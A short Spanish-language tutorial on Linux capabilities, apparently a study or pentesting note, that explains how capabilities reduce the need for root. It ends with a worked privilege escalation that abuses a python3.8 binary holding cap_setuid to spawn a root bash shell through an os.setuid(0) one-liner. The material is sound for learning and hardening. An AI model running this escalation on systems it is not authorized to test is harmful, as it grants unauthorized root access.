Tradicionalmente, si querías que un programa pudiera, por ejemplo, abrir un puerto menor al 1024 o cambiar la hora del sistema, debías ejecutarlo como **root**. Esto es riesgoso, porque el proceso tendría acceso total al sistema.

Con las **capabilities**, puedes darle **solamente el permiso que necesita**, reduciendo la superficie de ataque.

Aquí algunos ejemplos comunes:

|Capability|Permiso que otorga|
|---|---|
|`CAP_NET_BIND_SERVICE`|Permite que un programa abra puertos < 1024|
|`CAP_NET_RAW`|Permite abrir sockets RAW (como lo hace `ping`)|
|`CAP_SYS_TIME`|Permite cambiar la hora del sistema|
|`CAP_SETUID`|Permite cambiar el UID del proceso|
|`CAP_SYS_BOOT`|Permite reiniciar el sistema|

 🛠️ Ver capabilities en un binario
Puedes ver las capacidades asignadas a un ejecutable con:

```
getcap -r 2>/dev/null

getcap /ruta/al/ejecutable
```

Ejemplo explotando esta vulnerabilidad

```
 getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

Detectamos que python3.8 puede utilizar cap_setuid que permite cambiar el uid de un proceso asi que ejecuntamos un bash con python con el uid de root y nos hacemos de una bash con privilegios elevados
 
nathamgcap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```